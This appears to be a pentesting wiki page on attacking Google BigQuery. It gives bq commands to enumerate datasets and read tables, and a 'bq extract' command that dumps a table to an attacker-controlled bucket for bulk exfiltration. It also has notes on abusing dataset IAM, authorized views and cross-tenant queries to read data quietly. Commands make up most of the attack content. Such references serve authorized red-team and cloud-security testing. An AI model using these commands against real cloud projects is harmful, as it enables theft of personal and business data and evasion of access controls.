---
title: "BigQuery: reading datasets and exfiltrating through queries and exports"
description: "Attacking BigQuery: reading datasets and tables, exfiltrating via queries and exports, and abusing dataset IAM."
keywords:
  - BigQuery
  - dataset
  - query
  - export
  - dataset IAM
  - exfiltration
---

# BigQuery

BigQuery is a serverless warehouse reached entirely through IAM. A principal with `bigquery.tables.getData` and `bigquery.jobs.create` reads any table it is granted, and the warehouse usually holds the crown-jewel data: events, PII, and analytics exports. Exfiltration is a query away, or an `extract` job to a bucket for bulk.

## Enumerating and reading

```bash
bq ls --project_id <proj>
bq ls <proj>:<dataset>
bq show --schema <proj>:<dataset>.<table>
bq query --use_legacy_sql=false 'SELECT * FROM `proj.dataset.table` LIMIT 1000'
```

## Bulk exfiltration

```bash
# dump a table to a bucket you control
bq extract --destination_format=NEWLINE_DELIMITED_JSON \
  proj:dataset.table gs://<attacker-or-reachable-bucket>/out-*.json
```

## Exploitation notes

- Dataset IAM is separate from project IAM: a dataset shared with `allAuthenticatedUsers` or a broad group is readable even without a project-level role.
- Authorized views and routines can leak rows from datasets you cannot read directly; enumerate them.
- Query results and cached tables persist; `bigquery.jobs.create` plus a `SELECT` across tenants is a quiet read.

## Tools

- **bq** / **gcloud** (`bq query`, `bq extract`).
- **BigQuery API** client libraries for scripted pulls.

## References

- [HackTricks Cloud: GCP BigQuery](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google Cloud: BigQuery access control](https://cloud.google.com/bigquery/docs/access-control)
